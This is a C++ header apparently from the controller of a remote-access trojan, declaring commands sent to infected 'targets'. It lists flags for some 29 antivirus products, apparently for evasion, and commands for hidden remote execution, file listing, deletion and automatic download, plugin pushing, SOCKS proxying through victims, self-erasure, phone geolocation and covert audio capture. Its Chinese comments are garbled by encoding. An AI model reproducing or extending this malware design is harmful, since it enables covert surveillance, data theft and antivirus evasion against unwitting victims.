/*!
	Description : ����������
	Author		: Ruining Song
	Date		: 2013.12.10
	Remark		:
		
			2013.12.10
				
				>> ����ļ�������� FMT
*/

#ifndef ControlConnectionH
#define ControlConnectionH
//---------------------------------------------------------------------------
#include "connection.h"
#include "target.h"

#define ANTI_NOTHING            0x00000000         // ��
#define ANTI_360			    0x00000001         // 360                  
#define ANTI_RISING			    0x00000002         // ����                 
#define ANTI_AVIRA		    	0x00000004         // Avira�� С��ɡ       
#define ANTI_KAP		    	0x00000008         // ����˹��             
#define ANTI_QQ     	    	0x00000010         // QQ                   
#define ANTI_JIANGMIN	    	0x00000020         // KV������
#define ANTI_V3LITE             0x00000040         // AhnLab V3 lite ����ʿ
#define ANTI_FETS               0x00000080         // �Ѷ���˹
#define ANTI_MPMON              0x00000100         // ΢��
#define ANTI_NORTON             0x00000200         // ŵ��                 
#define ANTI_KINGSOFT    		0x00000400         // ��ɽ��ȫ
#define ANTI_TREND				0x00000800		   // ���ƿƼ�
#define ANTI_PANDA              0x00001000         // Panda, ��è
#define ANTI_MCAFEE             0x00002000         // mcaffee
#define ANTI_SKY                0x00004000         // ������ȫ
#define ANTI_QUZHUJIAN          0x00008000         // ����
#define ANTI_BITDEFENDER        0x00010000         // BitDefender
#define ANTI_AVG				0x00020000		   // avg
#define ANTI_GDATA              0x00040000         // G DATA
#define ANTI_TRUSTPORT			0x00080000		   // Trust port
#define ANTI_COMODO				0x00100000		   // Comodo
#define ANTI_BAIDU				0x00200000		   // Baidu
#define ANTI_ANTIAN				0x00400000		   // ����
#define ANTI_AVAST				0x00800000		   // avast
#define ANTI_FSECURE			0x01000000		   // f-secure
#define ANTI_NPROTECT			0x02000000		   // n-protect
#define ANTI_SPIDER				0x04000000		   // ��֩��
#define ANTI_Sophos				0x08000000		   // Sophos

//---------------------------------------------------------------------------

class ControlConnection : public Connection
{

public:
     ControlConnection(SOCKET sock);

	 void FlowStatistics(unsigned int bytes) { }

protected:

	virtual void  HandleIncomingData();
    virtual void  ConnectionCompleted();
    virtual void  ConnectionClosed();

public:
    void  Send_Identity();
    void  Send_HEL();
    void  Send_INI();
    void  Send_FLD();

    // ��ѯ��������ת������Ǩ����Ϣ
    //
    void  Send_QDA(ULONG targetId);
    void  Send_SDA(PBYTE lpData, DWORD dwDataSize);

	void  Send_SDA(ULONG targetId, DWORD value);

    // ������
    //
    void  Send_PLI(ULONG targetId);       // ��ѯ�����Ϣ
    void  Send_PLD(ULONG targetId, ULONG pluginId, PBYTE data, ULONG dataLen);       // ���ò������
    void  StartUptPluginToDaemon(DWORD dwPluginId, DWORD dwNewPlgVer, DWORD dwOsType);
    void  Send_UPL(DWORD       dwPluginId,
                             DWORD       dwNewPlgVer,
                             DWORD       dwStartPos,                             
                             std::string flag,
                             PCHAR       lpData,
                             DWORD       dwDataLen,
							 DWORD		 dwOsType);

    void  Send_STA(ULONG targetId);       // ��ѯĿ��״̬
    void  Send_PNG();                     // ������Ӧ
        
    void  Send_LIR(ULONG targetId);                       // ��ѯĿ���̷��б�
    void  Send_DIR(ULONG targetId,   const char *base64Path);     // ��ѯĿ��Ŀ¼��Ϣ
    void  Send_FDL(ULONG targetId,   const char *base64Path);     // ɾ��Ŀ���ϵ�ĳ���ļ�
    
    // Ŀ�����: �Ի١���Ĭ�����
    //
    void  Send_ERA(ULONG targetId);
    void  Send_SDS(ULONG targetId);
    void  Send_SIL(ULONG targetId, FILETIME &ftBeg, FILETIME &ftEnd);

    // ����
    //
    void  Send_SCP(ULONG  targetID);

    // ��������
    //
    void  Send_OSC(ULONG          targetID,
                             ULONG          osId,
                             const char*          tarDirPathBase64,
                             ULONG          level,
                             PSearchFilter  lpSearchFilter);                    // ��������

    void  Send_OSF(ULONG          targetID,
                             ULONG          osId);                              // ֹͣ����

    // Socks����
    //
    void  Send_SSX(ULONG ulTargetID,  USHORT usPort); // ����
    void  Send_SSX(ULONG ulTargetID,  USHORT usPort, PCHAR lpszUser, PCHAR lpszPass); // ����
    void  Send_ESX(ULONG ulTargetID);                                 // ֹͣ

    // plugin manager cmd (direct to target)
    //
    void  Send_PLG(ULONG targetId, ULONG   pluginId, char    *plgType);
    
    void  Send_CRP(Target *tarBlock, std::wstring procPath, BOOL bHideExec);
    
    // Զ����չִ��
    //
    void  Send_RUN(DWORD dwTargetId, std::wstring procPath, BOOL bRedirectIO);
    void  Send_CITW(DWORD dwTargetID, std::wstring widInput);
    void  Send_CITA(DWORD dwTargetID, std::string aniInput);
    void  Send_CFI(DWORD dwTargetID);

	// �ļ����
	void Send_FMT(DWORD dwTargetId, std::wstring path, ULONG add, std::wstring ext);

	// ��ȡ���ڵأ��ֻ�ר�ã�
	void Send_GPRS(DWORD dwTargetId);
	int Handle_GPRS(std::vector<std::string> & args);

	// �Զ���ȡ
	void Send_AGT(
		ULONG      targetID,
		TaskDirect taskDirect,
		const char*      tarDirPathBase64,
		ULONG      level,
		ULONG      autoDown);

	// ������
	void Send_BACKSOUND(ULONG targetID, bool open, ULONG time);

private:

  	//static std::map<std::string,CtrCmdHandler > commandHandlers;
    
    int   DispatchCommand(std::vector<std::string> & args);
    void  RegisterCommandHandlers();

    int   Handle_OUT(std::vector<std::string> & args);
    
    int   Handle_HEL(std::vector<std::string> & args);
    int   Handle_INI(std::vector<std::string> & args);
    int   Handle_TAR(std::vector<std::string> & args);
    int   Handle_CIN(std::vector<std::string> & args);
    int   Handle_STA(std::vector<std::string> & args);
    int   Handle_LOG(std::vector<std::string> & args);

    int   Handle_TSW(std::vector<std::string> & args);

    int   Handle_QDA(std::vector<std::string> & args);
    
    int   Handle_QNG(std::vector<std::string> & args);
    
    int   Handle_LIR(std::vector<std::string> & args);
    int   Handle_DIR(std::vector<std::string> & args);
    int   Handle_FDL(std::vector<std::string> & args);
    
    // ����
    //
    int   Handle_SCP(std::vector<std::string> & args);

    // ��������
    //
    int   Handle_OSC(std::vector<std::string> & args);            // ��������
    int   Handle_OSF(std::vector<std::string> & args);            // �˹�ֹͣ�����
    int   Handle_OSI(std::vector<std::string> & args);            // �õ�������

    // Socks����
    //
    int   Handle_SSX(std::vector<std::string> & args);
    int   Handle_ESX(std::vector<std::string> & args);

    // ������
    //
    int   Handle_PLI(std::vector<std::string> & args);
    int   Handle_PLD(std::vector<std::string> & args);
    int   Handle_UPL(std::vector<std::string> & args);            // �����������ת������
    
    int   Handle_PLG(std::vector<std::string> & args);

    int   Handle_CRP(std::vector<std::string> & args);
    int   Handle_RUN(std::vector<std::string> & args);
    int   Handle_CIT(std::vector<std::string> & args);            // Console Input
    int   Handle_COT(std::vector<std::string> & args);            // Console Output
    int   Handle_CFI(std::vector<std::string> & args);            // Console Finished

    int   Handle_ERA(std::vector<std::string> & args);
    int   Handle_SDS(std::vector<std::string> & args);
    int   Handle_SIL(std::vector<std::string> & args);

	// �ļ����
	int Handle_FMT(std::vector<std::string> &args);

	// ������
	int Handle_BACKSOUND(std::vector<std::string>& args);

public:
    DWORD   dwCtrUserId;
    
    PFileTask	PlgUptFileTask[32][MAX_PLG_COUNT];		// ר�����ڲ���������ļ�������һ�����񲢲�������ת��������ȣ�ֱ���߿�������
};

//typedef int  (ControlConnection::* CtrCmdHandler)(std::vector<std::string> &);
//extern std::map<std::string,CtrCmdHandler > commandHandlers;

#endif
